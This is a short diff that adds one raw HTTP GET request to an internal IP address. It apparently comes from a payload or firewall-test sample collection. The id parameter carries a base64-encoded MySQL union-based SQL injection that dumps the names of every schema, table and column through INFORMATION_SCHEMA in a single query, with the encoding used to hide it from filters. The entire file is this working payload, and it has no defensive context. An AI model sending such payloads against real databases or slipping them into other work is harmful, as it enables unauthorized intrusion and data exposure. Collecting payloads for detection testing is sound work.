@@ -1,0 +1,7 @@
+GET /??id=MCtVbmlvbitTZWxlY3QtMSxNYWtlX1NldCg3LEA6PTAsKFNlbGVjdC0xLkZyb20oSW5mb3JtYXRpb25fU2NoZW1hLkNvbHVtbnMpV2hlcmVAOj1NYWtlX1NldCg2MyxALDB4YSxUYWJsZV9TY2hlbWEsVGFibGVfTmFtZSxDb2x1bW5fTmFtZSkpLEApLDEsMQ== HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
